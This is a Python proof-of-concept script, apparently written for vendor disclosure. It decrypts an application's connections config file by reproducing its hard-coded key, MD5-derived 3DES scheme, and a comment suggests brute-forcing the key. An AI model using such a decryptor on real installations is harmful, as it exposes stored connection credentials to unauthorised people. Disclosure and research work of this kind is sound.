#!/usr/bin/python
# Requires pyDes http://twhiteman.netfirms.com/des.html 
# Author: @beyondnegative / bneg
#
# About:
# I found an application that hard-coded the crypto password in the app.
# Reversing the application led me to the encrypt/decrypt methods. This
# Python script decrypts the config file the app encrypts
# How it works
# Acme's code takes the hardcoded key, generates an MD5sum and then uses
# the MD5 byte hash as the 3DES key. After encrypting, the data is encoded in 
# Base64 and written to file.
#
# A key override option was created in case this static string doesn't perist
# across versions or installs (my money is on this string being static everywhere)
#
# Lots of extra cruft in here, written as a PoC for the vendor
#
import hashlib
import base64
import pyDes
import sys, getopt
from pyDes import *
from hashlib import *


def main(argv):
  inputfile = ''
  key = "somestring" # Secret key, default unless opt override
  
  try:
      opts, args = getopt.getopt(argv, "hi:k:",["input=", "key="])
  except getopt.GetoptError:
      usage()
      sys.exit(2)

  for opt, arg in opts:
    if opt == '-h':
        usage()
        sys.exit()
    elif opt in ("-k", "--key"):
        key = arg
    elif opt in ("-i", "--input"):
        inputfile = arg
    else:
        usage()

  crypto(inputfile,key)

def usage():
  print "\n====> Acme File Decryptor <======\n"
  print "For Acme Version 10"
  print "* Takes Acme_Connections.xml and decrypts to plaintext\n"
  print "Usage:"
  print '3des_decrypt.py -i <inputfile> -k <key> (optional)\n'
  sys.exit(2)

def crypto(inputfile, key):
  print "\n"
  crypt = open(inputfile, 'r')
  crypt = crypt.read()
  keyhash = hashlib.md5(key)

  print "Secret Acme Key: %r" % key
  print "MD5 Sum of key: %r" % keyhash.hexdigest() + "\n"

# Generate the keyhash and 3DES parameters
  keyhash = keyhash.digest()
  k = triple_des(keyhash, ECB, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)

# Print out base64 blog for verification
  print "Encrypted Base64 Encoded Blob"
  print "=================================================="
  print crypt
  print "\n"

# Convert contents from base64, then decrypt
  bincrypt = base64.b64decode(crypt) # Decode orig from base64
  cleartext = k.decrypt(bincrypt, padmode=PAD_PKCS5)

# Display the plaintext
  print "Decrypted Content:"
  print "=================================================="
  print cleartext
  print "\n"

# Reincrypt and assert true to verify everything worked
# This is also a step we could use if we wanted to brute
# the key. The assert would fail on wrong keys, which we
# could capture and try a different key.
  cryptotext = cleartext
  cryptotext = k.encrypt(cleartext, padmode=PAD_PKCS5)
  cryptotext = base64.b64encode(cryptotext)
#TODO: FIX
#  assert cryptotext == inputfile

if __name__ == "__main__":
    main(sys.argv[1:])
